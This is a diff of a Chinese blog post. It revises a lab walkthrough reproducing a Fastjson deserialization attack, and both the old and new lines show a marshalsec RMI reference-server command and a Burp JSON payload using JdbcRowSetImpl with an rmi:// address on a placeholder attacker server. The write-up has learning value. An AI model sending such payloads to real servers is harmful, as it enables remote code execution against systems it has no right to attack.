@@ -404,7 +404,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    750
+                    769
                 </div>
                 
 
@@ -475,11 +475,14 @@
 <p><img src="https://i.loli.net/2021/09/16/xh3gPHeXZBwDjEA.png" alt="image-20210916190611966"></p>
 <p>编译完成会出现<code>BUILD SUCCESS</code>，target目录下会生成marshalsec-0.0.3-SNAPSHOT-all.jar文件</p>
 <p><img src="https://i.loli.net/2021/09/16/6OFLAdjEXPINl9v.png" alt="image-20210916201555690"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;搭建dnslog.class类http服务的服务器:1111&#x2F;#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>
-<h4 id="burp构造请求包"><a href="#burp构造请求包" class="headerlink" title="burp构造请求包"></a>burp构造请求包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 靶机Ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 160</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;b&quot;:&#123;</span><br><span class="line">            &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">            &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;搭建dnslog.class类的服务器ip:1111&#x2F;xxx.ceye.io&quot;,</span><br><span class="line">            &quot;autoCommit&quot;:true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;搭建dnslog.class类http服务的服务器:1111&#x2F;#dnslog&quot; 9999</span><br></pre></td></tr></table></figure>
+<h4 id="burp构造请求包"><a href="#burp构造请求包" class="headerlink" title="burp构造请求包"></a>burp构造请求包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 靶机Ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 160</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;b&quot;:&#123;</span><br><span class="line">            &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">            &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;搭建dnslog.class类的服务器ip:1111&#x2F;dnslog&quot;,</span><br><span class="line">            &quot;autoCommit&quot;:true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>后来又在另一台vps上搭建了jdk+maven环境进行测试</p>
 <p><img src="https://i.loli.net/2021/09/17/kMCgWVD1Zxmj6Ki.png" alt="image-20210917210129994"></p>
-<p>但是要访问的文件不存在，请求包中构造错了，<code>xxx/ceye.io</code>改为<code>dnslog</code></p>
+<p>但是要访问的文件不存在，代码没整明白，请求包中构造错了</p>
+<p><u>xxx/ceye.io改为dnslog</u></p>
+<p><img src="https://i.loli.net/2021/09/17/FEkLDANtGj4svyX.png" alt="image-20210917212757304"></p>
+<p>过了十分钟又有请求了，但还是不行</p>
 <p>然后就一直访问不上，怀疑是ceye.io存在问题，ceye.io平台也没有数据</p>
 <blockquote>
 <p>目前没找到好用的dnslog平台，可以尝试自己搭建一个来使用</p>
